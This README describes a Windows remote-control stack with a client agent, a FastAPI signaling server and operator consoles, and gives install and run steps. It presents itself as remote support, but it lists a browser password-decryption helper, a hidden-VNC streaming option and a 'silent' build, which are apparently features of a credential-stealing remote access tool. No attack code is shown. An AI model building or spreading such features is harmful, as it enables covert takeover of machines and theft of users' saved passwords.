# Remote Controller

Remote support stack with a Windows client, a FastAPI signaling server, and operator consoles (web + desktop). Designed for authorized remote assistance.

**Components**
- `client/` - Windows agent that captures desktop/audio and connects via WebRTC.
- `operator/` - Browser-based operator console (static HTML/JS/CSS).
- `operator_desktop/` - PyQt6 desktop wrapper for the operator UI.
- `server/` - Signaling server and API (FastAPI + WebSocket + asyncpg).
- `password_extractor/` - Windows helper for browser data decryption.

**Prerequisites**
- Python 3.11+
- Windows 10/11 for client and operator desktop builds
- Postgres for the server (configure with `RC_DATABASE_URL`)

**Install dependencies**
1. Create and activate a virtual environment.
2. Install per component:
```bash
pip install -r client/requirements-client.txt
pip install -r operator_desktop/requirements.txt
pip install -r server/app/requirements.txt
```
3. Or install everything:
```bash
pip install -r requirements_global.txt
```

**Run locally**
1. Start the signaling server: `python server/app/signaling_server.py`
2. Launch the operator desktop: `python operator_desktop/app.py`
3. Run the client: `python client/client.py`
4. Open the web operator UI: open `operator/index.html`

**Build**
- Client: `client/build_windows.bat`
- Operator desktop: `operator_desktop/build_windows_silent.bat`

**Key environment variables**
- `RC_SIGNALING_HOST`, `RC_SIGNALING_PORT`, `RC_SIGNALING_URL`, `RC_SIGNALING_TOKEN`, `RC_API_TOKEN`
- `RC_DATABASE_URL`, `RC_ICE_SERVERS`
- `RC_HVNC_DUAL_STREAM=1` (dual stream) or `RC_HVNC_DUAL_STREAM=0` (single stream)

**Tests**
- `pytest tests/`
